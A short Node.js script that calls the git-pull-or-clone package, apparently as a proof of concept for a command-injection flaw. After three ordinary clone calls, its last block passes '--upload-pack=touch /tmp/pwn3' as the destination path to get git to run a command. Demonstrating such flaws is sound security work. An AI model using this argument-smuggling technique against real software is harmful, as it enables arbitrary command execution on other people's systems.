var path = require("path")
var gitPullOrClone = require('git-pull-or-clone')
var TMP_PATH = path.join(__dirname, '..', 'tmp')
var OUT_PATH = path.join(TMP_PATH, 'git-pull-or-clone')
var REPO_URL = 'https://github.com/feross/git-pull-or-clone.git'


gitPullOrClone(REPO_URL, OUT_PATH, (err) => {
})

gitPullOrClone(REPO_URL, OUT_PATH, { depth: Infinity }, (err) => {
})

gitPullOrClone('git@github.com:feross/standard.git', '/path/to/destination', (err) => {
  if (err) throw err
  console.log('SUCCESS!')
})

var OUT_TEST_FILE = '/tmp/pwn3'
var REPO_LOCAL_PATH = `file://${OUT_PATH}`
var OUT_PATH_INJECTION = `--upload-pack=touch ${OUT_TEST_FILE}`

gitPullOrClone(REPO_LOCAL_PATH, OUT_PATH_INJECTION, () => {
})